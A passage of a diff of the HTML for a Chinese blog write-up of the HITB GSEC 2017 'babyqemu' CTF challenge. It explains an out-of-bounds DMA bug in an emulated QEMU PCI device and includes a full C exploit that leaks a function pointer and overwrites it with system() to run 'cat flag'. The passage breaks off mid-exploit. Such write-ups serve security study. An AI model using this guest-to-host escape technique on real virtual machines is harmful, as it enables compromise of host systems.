+</span></span><span class=line><span class=cl>        <span class=n>addr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span><span class=nf>LODWORD</span><span class=p>(</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cnt</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>((</span><span class=kt>void</span> <span class=p>(</span><span class=kr>__fastcall</span> <span class=o>*</span><span class=p>)(</span><span class=kt>char</span> <span class=o>*</span><span class=p>,</span> <span class=kt>uint8_t</span> <span class=o>*</span><span class=p>,</span> <span class=kt>dma_addr_t</span><span class=p>))</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>enc</span><span class=p>)(</span><span class=n>v6</span><span class=p>,</span> <span class=n>addr</span><span class=p>,</span> <span class=n>v5</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>v4</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=n>v5</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>4</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>=</span> <span class=n>v4</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFFFFFFFFFELL</span><span class=p>;</span>  <span class=c1>// 把最低bit清掉了。又可以再次写入了
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span> <span class=n>v5</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>irq_status</span> <span class=o>|=</span> <span class=mh>0x100u</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=nf>hitb_raise_irq</span><span class=p>(</span><span class=n>opaque</span><span class=p>,</span> <span class=p>(</span><span class=kt>uint32_t</span><span class=p>)</span><span class=n>addr</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>cmd的bit含义</p><ol><li>bit1 &mdash;&ndash;> 是否为合规cmd（推测</li><li>bit2 &mdash;&ndash;> dma.dst向dma.src拷贝，还是相反方向</li><li>bit3 &mdash;&ndash;> 是否使用enc函数加密</li></ol><p><code>cpu_physical_memory_rw</code>函数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -871,39 +678,24 @@ $ cat /sys/devices/pci0000<span class=se>\:</span>00/0000<span class=se>\:</span
 </span><span class=lnt>15
 </span><span class=lnt>16
 </span><span class=lnt>17
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=c1>// qemu-5.1.0/exec.c
-</span><span class=c1></span><span class=n>MemTxResult</span> <span class=nf>address_space_rw</span><span class=p>(</span><span class=n>AddressSpace</span> <span class=o>*</span><span class=n>as</span><span class=p>,</span> <span class=n>hwaddr</span> <span class=n>addr</span><span class=p>,</span> <span class=n>MemTxAttrs</span> <span class=n>attrs</span><span class=p>,</span>
-                             <span class=kt>void</span> <span class=o>*</span><span class=n>buf</span><span class=p>,</span> <span class=n>hwaddr</span> <span class=n>len</span><span class=p>,</span> <span class=kt>bool</span> <span class=n>is_write</span><span class=p>)</span>
-<span class=p>{</span>
-    <span class=k>if</span> <span class=p>(</span><span class=n>is_write</span><span class=p>)</span> <span class=p>{</span>
-        <span class=k>return</span> <span class=n>address_space_write</span><span class=p>(</span><span class=n>as</span><span class=p>,</span> <span class=n>addr</span><span class=p>,</span> <span class=n>attrs</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=n>len</span><span class=p>);</span>
-    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
-        <span class=k>return</span> <span class=n>address_space_read_full</span><span class=p>(</span><span class=n>as</span><span class=p>,</span> <span class=n>addr</span><span class=p>,</span> <span class=n>attrs</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=n>len</span><span class=p>);</span>
-    <span class=p>}</span>
-<span class=p>}</span>
-
-<span class=kt>void</span> <span class=nf>cpu_physical_memory_rw</span><span class=p>(</span><span class=n>hwaddr</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>void</span> <span class=o>*</span><span class=n>buf</span><span class=p>,</span>
-                            <span class=n>hwaddr</span> <span class=n>len</span><span class=p>,</span> <span class=kt>bool</span> <span class=n>is_write</span><span class=p>)</span>
-<span class=p>{</span>
-    <span class=n>address_space_rw</span><span class=p>(</span><span class=o>&amp;</span><span class=n>address_space_memory</span><span class=p>,</span> <span class=n>addr</span><span class=p>,</span> <span class=n>MEMTXATTRS_UNSPECIFIED</span><span class=p>,</span>
-                     <span class=n>buf</span><span class=p>,</span> <span class=n>len</span><span class=p>,</span> <span class=n>is_write</span><span class=p>);</span>
-<span class=p>}</span>
-</code></pre></td></tr></table>
-</div>
-</div><p><code>is_write==1</code>: 从buf读取len，写入物理地址addr。</p>
-<p><code>is_write==0</code>: 从物理地址addr读取，写入buf。</p>
-<h2 id=漏洞点>漏洞点</h2>
-<p>在DMA的read和write中存在越界。</p>
-<h2 id=exploit>exploit</h2>
-<p>从<code>HitbState</code>可以看出，成员<code>dma_buf</code>后方紧跟<code>enc</code>函数指针。</p>
-<p>读取<code>enc</code>的函数地址，通过偏移得到<code>system@plt.got</code>的地址，写入到<code>enc</code>。</p>
-<p>写入<code>cat flag</code>字符串，使<code>enc</code>以这个字符串来调用。</p>
-<p><a href=https://github.com/clxsh/ctf_wps/blob/master/others/qemu_pwn/HITB_GSEC_2017_babyqemu/exp.c>exp</a></p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// qemu-5.1.0/exec.c
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>MemTxResult</span> <span class=nf>address_space_rw</span><span class=p>(</span><span class=n>AddressSpace</span> <span class=o>*</span><span class=n>as</span><span class=p>,</span> <span class=n>hwaddr</span> <span class=n>addr</span><span class=p>,</span> <span class=n>MemTxAttrs</span> <span class=n>attrs</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                             <span class=kt>void</span> <span class=o>*</span><span class=n>buf</span><span class=p>,</span> <span class=n>hwaddr</span> <span class=n>len</span><span class=p>,</span> <span class=kt>bool</span> <span class=n>is_write</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>is_write</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nf>address_space_write</span><span class=p>(</span><span class=n>as</span><span class=p>,</span> <span class=n>addr</span><span class=p>,</span> <span class=n>attrs</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=n>len</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nf>address_space_read_full</span><span class=p>(</span><span class=n>as</span><span class=p>,</span> <span class=n>addr</span><span class=p>,</span> <span class=n>attrs</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=n>len</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>cpu_physical_memory_rw</span><span class=p>(</span><span class=n>hwaddr</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>void</span> <span class=o>*</span><span class=n>buf</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                            <span class=n>hwaddr</span> <span class=n>len</span><span class=p>,</span> <span class=kt>bool</span> <span class=n>is_write</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>address_space_rw</span><span class=p>(</span><span class=o>&amp;</span><span class=n>address_space_memory</span><span class=p>,</span> <span class=n>addr</span><span class=p>,</span> <span class=n>MEMTXATTRS_UNSPECIFIED</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                     <span class=n>buf</span><span class=p>,</span> <span class=n>len</span><span class=p>,</span> <span class=n>is_write</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>is_write==1</code>: 从buf读取len，写入物理地址addr。</p><p><code>is_write==0</code>: 从物理地址addr读取，写入buf。</p><h2 id=漏洞点>漏洞点</h2><p>在DMA的read和write中存在越界。</p><h2 id=exploit>exploit</h2><p>从<code>HitbState</code>可以看出，成员<code>dma_buf</code>后方紧跟<code>enc</code>函数指针。</p><p>读取<code>enc</code>的函数地址，通过偏移得到<code>system@plt.got</code>的地址，写入到<code>enc</code>。</p><p>写入<code>cat flag</code>字符串，使<code>enc</code>以这个字符串来调用。</p><p><a href=https://github.com/clxsh/ctf_wps/blob/master/others/qemu_pwn/HITB_GSEC_2017_babyqemu/exp.c>exp</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
 </span><span class=lnt>  2
 </span><span class=lnt>  3
 </span><span class=lnt>  4
@@ -1052,233 +844,172 @@ $ cat /sys/devices/pci0000<span class=se>\:</span>00/0000<span class=se>\:</span
 </span><span class=lnt>147
 </span><span class=lnt>148
 </span><span class=lnt>149
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
-</span><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
-</span><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
-</span><span class=cp>#include</span> <span class=cpf>&lt;sys/stat.h&gt;</span><span class=cp>
-</span><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
-</span><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
-</span><span class=cp>#include</span> <span class=cpf>&lt;sys/mman.h&gt;</span><span class=cp>
-</span><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
-</span><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
-</span><span class=cp>#include</span> <span class=cpf>&lt;assert.h&gt;</span><span class=cp>
-</span><span class=cp></span>
-<span class=cp>#define PAGE_SHIFT 12
-</span><span class=cp>#define DMA_BASE 0x40000
-</span><span class=cp></span>
-<span class=kt>uint8_t</span> <span class=o>*</span><span class=n>iomem</span><span class=p>;</span>
-<span class=kt>uint8_t</span> <span class=o>*</span><span class=n>dmabuf</span><span class=p>;</span>
-<span class=kt>uint64_t</span> <span class=n>dmabuf_phys_addr</span><span class=p>;</span>
-
-<span class=kt>void</span> <span class=nf>die</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>msg</span><span class=p>)</span>
-<span class=p>{</span>
-    <span class=n>perror</span><span class=p>(</span><span class=n>msg</span><span class=p>);</span>
-    <span class=n>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
-<span class=p>}</span>
-
-<span class=kt>uint64_t</span> <span class=nf>virt2phys</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>p</span><span class=p>)</span>
-<span class=p>{</span>
-    <span class=kt>uint64_t</span> <span class=n>virt</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint64_t</span><span class=p>)</span><span class=n>p</span><span class=p>;</span>
-    <span class=n>assert</span><span class=p>((</span><span class=n>virt</span><span class=o>&amp;</span><span class=mh>0xfff</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
-
-    <span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=s>&#34;/proc/self/pagemap&#34;</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>);</span>
-    <span class=k>if</span> <span class=p>(</span><span class=n>fd</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
-        <span class=n>die</span><span class=p>(</span><span class=s>&#34;open2&#34;</span><span class=p>);</span>
-    <span class=p>}</span>
-
-    <span class=kt>uint64_t</span> <span class=n>offset</span> <span class=o>=</span> <span class=n>virt</span> <span class=o>&gt;&gt;</span> <span class=p>(</span><span class=n>PAGE_SHIFT</span><span class=o>-</span><span class=mi>3</span><span class=p>);</span>
-    <span class=n>lseek</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>offset</span><span class=p>,</span> <span class=n>SEEK_SET</span><span class=p>);</span>
-
-    <span class=kt>uint64_t</span> <span class=n>phys</span><span class=p>;</span>
-    <span class=k>if</span> <span class=p>(</span><span class=n>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>phys</span><span class=p>,</span> <span class=mi>8</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>8</span><span class=p>)</span> <span class=p>{</span>
-        <span class=n>die</span><span class=p>(</span><span class=s>&#34;read&#34;</span><span class=p>);</span>
-    <span class=p>}</span>
-
-    <span class=n>assert</span><span class=p>(</span><span class=n>phys</span> <span class=o>&amp;</span> <span class=p>(</span><span class=mi>1ULL</span> <span class=o>&lt;&lt;</span> <span class=mi>63</span><span class=p>));</span>
-
-    <span class=n>phys</span> <span class=o>=</span> <span class=p>(</span><span class=n>phys</span> <span class=o>&amp;</span> <span class=p>((</span><span class=mi>1ULL</span> <span class=o>&lt;&lt;</span> <span class=mi>54</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>))</span> <span class=o>&lt;&lt;</span> <span class=n>PAGE_SHIFT</span><span class=p>;</span>
-    <span class=k>return</span> <span class=n>phys</span><span class=p>;</span>
-<span class=p>}</span>
-
-<span class=kt>void</span> <span class=nf>iowrite</span><span class=p>(</span><span class=kt>uint64_t</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>uint64_t</span> <span class=n>value</span><span class=p>)</span>
-<span class=p>{</span>
-    <span class=o>*</span><span class=p>((</span><span class=kt>uint64_t</span> <span class=o>*</span><span class=p>)(</span><span class=n>iomem</span> <span class=o>+</span> <span class=n>addr</span><span class=p>))</span> <span class=o>=</span> <span class=n>value</span><span class=p>;</span>
-<span class=p>}</span>
-
-<span class=kt>uint64_t</span> <span class=nf>ioread</span><span class=p>(</span><span class=kt>uint64_t</span> <span class=n>addr</span><span class=p>)</span>
-<span class=p>{</span>
-    <span class=k>return</span> <span class=o>*</span><span class=p>((</span><span class=kt>uint64_t</span> <span class=o>*</span><span class=p>)(</span><span class=n>iomem</span> <span class=o>+</span> <span class=n>addr</span><span class=p>));</span>
-<span class=p>}</span>
-
-<span class=kt>void</span> <span class=nf>dma_setsrc</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>src</span><span class=p>)</span>
-<span class=p>{</span>
-    <span class=n>iowrite</span><span class=p>(</span><span class=mh>0x80</span><span class=p>,</span> <span class=n>src</span><span class=p>);</span>
-<span class=p>}</span>
-
-<span class=kt>void</span> <span class=nf>dma_setdst</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>dst</span><span class=p>)</span>
-<span class=p>{</span>
-    <span class=n>iowrite</span><span class=p>(</span><span class=mh>0x88</span><span class=p>,</span> <span class=n>dst</span><span class=p>);</span>
-<span class=p>}</span>
-
-<span class=kt>void</span> <span class=nf>dma_setcnt</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>cnt</span><span class=p>)</span>
-<span class=p>{</span>
-    <span class=n>iowrite</span><span class=p>(</span><span class=mh>0x90</span><span class=p>,</span> <span class=n>cnt</span><span class=p>);</span>
-<span class=p>}</span>
-
-<span class=kt>void</span> <span class=nf>dma_setcmd</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>cmd</span><span class=p>)</span>
-<span class=p>{</span>
-    <span class=n>iowrite</span><span class=p>(</span><span class=mh>0x98</span><span class=p>,</span> <span class=n>cmd</span><span class=p>);</span>
-<span class=p>}</span>
-
-<span class=kt>void</span> <span class=nf>dma_read</span><span class=p>(</span><span class=kt>uint64_t</span> <span class=n>addr</span><span class=p>,</span> <span class=n>size_t</span> <span class=n>len</span><span class=p>)</span>
-<span class=p>{</span>
-    <span class=n>dma_setsrc</span><span class=p>(</span><span class=n>addr</span><span class=p>);</span>
-    <span class=n>dma_setdst</span><span class=p>(</span><span class=n>dmabuf_phys_addr</span><span class=p>);</span>
-    <span class=n>dma_setcnt</span><span class=p>(</span><span class=n>len</span><span class=p>);</span>
-    <span class=n>dma_setcmd</span><span class=p>(</span><span class=mh>0x3</span><span class=p>);</span>
-    <span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
-<span class=p>}</span>
-
-<span class=kt>void</span> <span class=nf>dma_write</span><span class=p>(</span><span class=kt>uint64_t</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>void</span> <span class=o>*</span><span class=n>buf</span><span class=p>,</span> <span class=n>size_t</span> <span class=n>len</span><span class=p>)</span>
-<span class=p>{</span>
-    <span class=n>memcpy</span><span class=p>(</span><span class=n>dmabuf</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=n>len</span><span class=p>);</span>
-
-    <span class=n>dma_setsrc</span><span class=p>(</span><span class=n>dmabuf_phys_addr</span><span class=p>);</span>
-    <span class=n>dma_setdst</span><span class=p>(</span><span class=n>addr</span><span class=p>);</span>
-    <span class=n>dma_setcnt</span><span class=p>(</span><span class=n>len</span><span class=p>);</span>
-    <span class=n>dma_setcmd</span><span class=p>(</span><span class=mh>0x1</span><span class=p>);</span>
-    <span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
-<span class=p>}</span>
-
-<span class=kt>void</span> <span class=nf>dma_enc_read</span><span class=p>(</span><span class=kt>uint64_t</span> <span class=n>addr</span><span class=p>,</span> <span class=n>size_t</span> <span class=n>len</span><span class=p>)</span>
-<span class=p>{</span>
-    <span class=n>dma_setsrc</span><span class=p>(</span><span class=n>addr</span><span class=p>);</span>
-    <span class=n>dma_setdst</span><span class=p>(</span><span class=n>dmabuf_phys_addr</span><span class=p>);</span>
-    <span class=n>dma_setcnt</span><span class=p>(</span><span class=n>len</span><span class=p>);</span>
-    <span class=n>dma_setcmd</span><span class=p>(</span><span class=mh>0x7</span><span class=p>);</span>
-    <span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
-<span class=p>}</span>
-
-<span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[])</span>
-<span class=p>{</span>
-    <span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=s>&#34;/sys/devices/pci0000:00/0000:00:04.0/resource0&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=o>|</span><span class=n>O_SYNC</span><span class=p>);</span>
-    <span class=k>if</span> <span class=p>(</span><span class=n>fd</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
-        <span class=n>die</span><span class=p>(</span><span class=s>&#34;open&#34;</span><span class=p>);</span>
-    <span class=p>}</span>
-
-    <span class=n>iomem</span> <span class=o>=</span> <span class=n>mmap</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>,</span> <span class=n>PROT_READ</span><span class=o>|</span><span class=n>PROT_WRITE</span><span class=p>,</span> <span class=n>MAP_SHARED</span><span class=p>,</span> <span class=n>fd</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
-    <span class=k>if</span> <span class=p>(</span><span class=n>iomem</span> <span class=o>==</span> <span class=n>MAP_FAILED</span><span class=p>)</span> <span class=p>{</span>
-        <span class=n>die</span><span class=p>(</span><span class=s>&#34;mmap&#34;</span><span class=p>);</span>
-    <span class=p>}</span>
-    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;iomem          @ %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>iomem</span><span class=p>);</span>
-
-    <span class=n>dmabuf</span> <span class=o>=</span> <span class=n>mmap</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>,</span> <span class=n>PROT_READ</span><span class=o>|</span><span class=n>PROT_WRITE</span><span class=p>,</span> <span class=n>MAP_SHARED</span><span class=o>|</span><span class=n>MAP_ANONYMOUS</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
-    <span class=k>if</span> <span class=p>(</span><span class=n>dmabuf</span> <span class=o>==</span> <span class=n>MAP_FAILED</span><span class=p>)</span> <span class=p>{</span>
-        <span class=n>die</span><span class=p>(</span><span class=s>&#34;mmap2&#34;</span><span class=p>);</span>
-    <span class=p>}</span>
-
-    <span class=c1>// lock part or all of the calling process&#39;s virtual address space
-</span><span class=c1></span>    <span class=c1>// into RAM, preventing that memory from being paged to the swap area.
-</span><span class=c1></span>    <span class=n>mlock</span><span class=p>(</span><span class=n>dmabuf</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>);</span>
-    <span class=n>dmabuf_phys_addr</span> <span class=o>=</span> <span class=n>virt2phys</span><span class=p>(</span><span class=n>dmabuf</span><span class=p>);</span>
-    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;dmabuff        @ %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>dmabuf</span><span class=p>);</span>
-    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;dmabuff(phys)  @ %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>dmabuf_phys_addr</span><span class=p>);</span>
-    <span class=n>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
-
-    <span class=c1>// leak hitb_enc address
-</span><span class=c1></span>    <span class=n>dma_read</span><span class=p>(</span><span class=n>DMA_BASE</span><span class=o>+</span><span class=mh>0x1000</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
-    <span class=kt>uint64_t</span> <span class=n>hitb_enc</span> <span class=o>=</span> <span class=o>*</span><span class=p>((</span><span class=kt>uint64_t</span> <span class=o>*</span><span class=p>)</span><span class=n>dmabuf</span><span class=p>);</span>
-
-    <span class=c1>// calculate the system plt.got address
-</span><span class=c1></span>    <span class=kt>uint64_t</span> <span class=n>elf_base</span>      <span class=o>=</span> <span class=n>hitb_enc</span> <span class=o>-</span> <span class=mh>0x283DD0</span><span class=p>;</span>
-    <span class=kt>uint64_t</span> <span class=n>system_pltgot</span> <span class=o>=</span> <span class=n>elf_base</span> <span class=o>+</span> <span class=mh>0x1FDB18</span><span class=p>;</span>
-    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;system@plt.got @ 0x%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>system_pltgot</span><span class=p>);</span>
-
-    <span class=n>dma_write</span><span class=p>(</span><span class=n>DMA_BASE</span><span class=o>+</span><span class=mh>0x1000</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>system_pltgot</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
-    <span class=kt>char</span> <span class=o>*</span><span class=n>payload</span> <span class=o>=</span> <span class=s>&#34;cat flag&#34;</span><span class=p>;</span>
-    <span class=n>dma_write</span><span class=p>(</span><span class=n>DMA_BASE</span><span class=o>+</span><span class=mh>0x100</span><span class=p>,</span> <span class=n>payload</span><span class=p>,</span> <span class=n>strlen</span><span class=p>(</span><span class=n>payload</span><span class=p>));</span>
-
-    <span class=n>dma_enc_read</span><span class=p>(</span><span class=n>DMA_BASE</span><span class=o>+</span><span class=mh>0x100</span><span class=p>,</span> <span class=mh>0x4</span><span class=p>);</span>
-    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
-<span class=p>}</span>
-</code></pre></td></tr></table>
-</div>
-</div><h2 id=参考>参考</h2>
-<ol>
-<li><a href=https://kitctf.de/writeups/hitb2017/babyqemu>HITB GSEC 2017: babyqemu</a></li>
-<li>[Sakura_University/外卡赛/HITB GSEC 2017 at master · tina2114/Sakura_University ](<a href=https://github.com/tina2114/Sakura_University/tree/master/>https://github.com/tina2114/Sakura_University/tree/master/</a>外卡赛/HITB GSEC 2017) zhz师傅tql</li>
-</ol>
-</div>
-<div class=post-copyright>
-<p class=copyright-item>
-<span class=item-title>文章作者</span>
-<span class=item-content>hhdx</span>
-</p>
-<p class=copyright-item>
-<span class=item-title>上次更新</span>
-<span class=item-content>
-2020-11-30
-</span>
-</p>
-</div>
-<footer class=post-footer>
-<div class=post-tags>
-<a href=/tags/qemu/>qemu</a>
-<a href=/tags/ctf/>CTF</a>
-</div>
-<nav class=post-nav>
-<a class=prev href=/post/cve-2015-5165/>
-<i class="iconfont icon-left"></i>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/stat.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/mman.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;assert.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=cp>#define PAGE_SHIFT 12
+</span></span></span><span class=line><span class=cl><span class=cp>#define DMA_BASE 0x40000
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=kt>uint8_t</span> <span class=o>*</span><span class=n>iomem</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=kt>uint8_t</span> <span class=o>*</span><span class=n>dmabuf</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=kt>uint64_t</span> <span class=n>dmabuf_phys_addr</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>die</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>msg</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>perror</span><span class=p>(</span><span class=n>msg</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>uint64_t</span> <span class=nf>virt2phys</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>p</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>virt</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint64_t</span><span class=p>)</span><span class=n>p</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nf>assert</span><span class=p>((</span><span class=n>virt</span><span class=o>&amp;</span><span class=mh>0xfff</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;/proc/self/pagemap&#34;</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>);</span>
